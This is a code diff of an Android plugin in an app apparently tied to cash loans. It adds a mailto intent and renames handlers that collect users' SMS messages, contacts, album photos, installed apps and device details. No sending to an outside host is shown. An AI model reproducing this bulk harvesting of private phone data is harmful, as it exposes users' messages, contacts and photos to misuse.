@@ -2,8 +2,10 @@ package com.music.violin.cash.violin.music.loan.store.cash.loan;
 
 import android.Manifest;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.provider.Settings;
 
 import androidx.core.app.ActivityCompat;
@@ -45,21 +47,29 @@ public class MyPlugin extends Plugin {
                     Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_SMS},
             CAMERA_REQUEST_CODE);
             return;
-        }  else {
+        }  else if (value.equals("getEmail")) {
+            try {
+                Intent data=new Intent(Intent.ACTION_SENDTO);
+                data.setData(Uri.parse("mailto:violin.customer@hotmail.com"));
+                getActivity().startActivity(data);
+            } catch (Exception e) {
+
+            }
+        }else {
             Map map = new HashMap();
             if (value.equals("getDeviceInfo")) {
                 map.put("device", GetDeviceUtils.getDeviceInfo(getActivity()));
             }
-            if (value.equals("getPhotoList")) {
+            if (value.equals("getPhoto")) {
                 map.put("photoList", GetDeviceUtils.getAlbumPhotos(getActivity()));
             }
-            if (value.equals("getAppList")) {
+            if (value.equals("getApp")) {
                 map.put("deviceApps", GetDeviceUtils.getDeviceApps(getActivity()));
             }
-            if (value.equals("getSmsList")) {
+            if (value.equals("getSms")) {
                 map.put("smsList", GetDeviceUtils.getPhoneSms(getActivity()));
             }
-            if (value.equals("getContactList")) {
+            if (value.equals("getContact")) {
                 map.put("deviceContacts", GetDeviceUtils.getContacts(getActivity()));
             }
             Gson gson = new Gson();
